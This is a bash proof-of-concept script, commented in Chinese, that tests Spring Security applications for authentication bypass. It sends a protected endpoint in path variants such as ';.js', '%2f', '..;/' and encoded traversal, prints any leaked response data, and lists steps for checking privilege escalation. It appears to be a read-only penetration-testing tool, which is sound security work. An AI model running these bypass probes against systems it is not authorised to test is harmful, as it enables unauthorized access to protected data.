#!/usr/bin/env bash
# ============================================================================
# Spring Security 白名单路径探测（permitAll 误配）
#
# 原理：Spring Security 的 authorizeHttpRequests 里常写成
#         .requestMatchers("/api/user/login", "/api/public/**").permitAll()
#       permitAll 匹配的是 **请求路径**，不是「已认证状态」。于是两类常见误配：
#         W1 路径后缀绕过：/api/admin/users 受限，但 /api/admin/users.json
#            或 /api/admin/users;.js 被 antMatcher 归一化后落到 permitAll
#         W2 通配过宽：/api/public/** 放行，但 /api/public/../admin 被容器
#            归一化前先匹配，结果直接进受限接口
#
# 判据（三态，缺一不可）：
#   ① 同一接口在「无 cookie」时返回 401/403
#   ② 加变体后缀后返回 200 且 body 不是登录页/错误页
#   ③ 变体响应与「随机路径」不同（排除 SPA 兜底和全局 200）
#
# 只做只读 GET/HEAD。任何变体都不带请求体。
#
# 用法: ./poc.sh <BASE_URL> <受保护路径> [Cookie值]
# ============================================================================
set -uo pipefail
source "$(dirname "$0")/../_lib/common.sh"

if [ $# -lt 2 ]; then
  cat >&2 <<'U'
用法: ./poc.sh <BASE_URL> <受保护路径> [Cookie]
  BASE_URL     如 https://api.example.com
  受保护路径   已知需要登录的接口，如 /api/admin/users 或 /api/user/profile
  Cookie       可选。给了就测「水平越权 + 路径绕过」的组合；不给只测匿名绕过
示例: ./poc.sh https://api.example.com /api/admin/users
判据: 裸路径 401/403，变体 200 且非登录页，且与随机基线不同 → BYPASS
U
  exit 1
fi

BASE="${1%/}"; PROT="${2#/}"; PROT="/$PROT"; CK="${3:-}"
need curl || exit 1

CKARG=()
[ -n "$CK" ] && CKARG=(-H "Cookie: $CK")

hdr "0. 基线"
RND=$(rand_path)
R=$(reqc GET "$BASE$RND" "${CKARG[@]}")
RND_C="${R%%$'\t'*}"; RND_FP=$(printf '%s' "$R" | norm)
dim "随机路径 → $RND_C"

hdr "1. 裸请求受保护路径（必须 401/403，否则本方法无意义）"
B=$(reqc GET "$BASE$PROT" "${CKARG[@]}")
BC="${B%%$'\t'*}"; BB="${B#*$'\t'}"
dim "$PROT → $BC len=$(printf '%s' "$BB" | wc -c)"
case "$BC" in
  401|403) ok "基线符合预期（受限）" ;;
  200) warn "裸请求就是 200 —— 要么该接口本来公开，要么你的 Cookie 已带权限"
       warn "继续测无意义，退出。换个真正受限的路径" ;;
  *)   warn "基线状态 $BC 非 401/403，结论不可靠，继续但请人工复核" ;;
esac

# 变体表。每条都对应一个真实框架的归一化差异，不是随便加的。
VARIANTS=(
  "$PROT.json"
  "$PROT/"
  "$PROT//"
  "$PROT;.js"
  "$PROT;a=b"
  "$PROT%2f"
  "$PROT%20"
  "$PROT?"
  "$PROT#"
  "$PROT/.json"
  "${PROT%/*}/%2e%2e${PROT##*/}"
  "$PROT..;/"
)

hdr "2. 逐变体测试（单变量：只改路径形态）"
HITS=0
for v in "${VARIANTS[@]}"; do
  resp=$(reqc GET "$BASE$v" "${CKARG[@]}")
  c="${resp%%$'\t'*}"; b="${resp#*$'\t'}"; fp=$(printf '%s' "$b" | norm)

  # ③ 与随机基线一致 → 兜底
  if [ "$c" = "$RND_C" ] && [ "$fp" = "$RND_FP" ]; then
    dim "$v → $c（与随机基线一致，兜底）"; continue
  fi
  # ② 必须 200
  if [ "$c" != "200" ]; then
    dim "$v → $c"; continue
  fi
  # 排除登录页 / 通用错误页（这些也是 200，但没有数据）
  if printf '%s' "$b" | grep -qiE '<title>[^<]*(登录|login|sign in|error|403|401)'; then
    dim "$v → 200 但是登录页/错误页（前端兜底）"; continue
  fi
  # 排除和裸响应完全一致（说明根本没进业务逻辑）
  if [ "$fp" = "$(printf '%s' "$BB" | norm)" ]; then
    dim "$v → 200 与裸响应一致"; continue
  fi

  ok "变体命中: $v → 200（$(printf '%s' "$b" | wc -c) 字节）"
  printf '%s' "$b" | head -c 200; echo
  HITS=$((HITS+1))
  sleep "$SLEEP"
done

hdr "结论"
if [ "$HITS" -gt 0 ]; then
  warn "$HITS 个变体返回了与基线不同的 200 内容"
  cat >&2 <<'U'
人工收口（必须做，否则可能是误报）：
  1) 变体返回的到底是不是**同一份数据**？用 jq 取一个业务字段比对，
     比如 .data.items[0].id。如果 id 和裸接口一致 → 真绕过；如果是空数组 → 只绕过了鉴权没拿到数据
  2) 关掉 Cookie 再打一次同样的变体。带 Cookie 200、不带 Cookie 也 200 → 匿名即可访问（更严重）
  3) 用另一个低权账号的 Cookie 重复。能读到别人的数据 → 水平越权叠加
报告口径：写清「哪个变体 + 绕过的是认证还是授权 + 拿到几个字段」，不要只写「存在未授权访问」
U
  verdict "spring-auth-whitelist-bypass" "BYPASS" "$HITS/${#VARIANTS[@]} 变体"
else
  ok "0 个变体绕过"
  verdict "spring-auth-whitelist-bypass" "SAFE" "12 个变体全部被拦"
fi
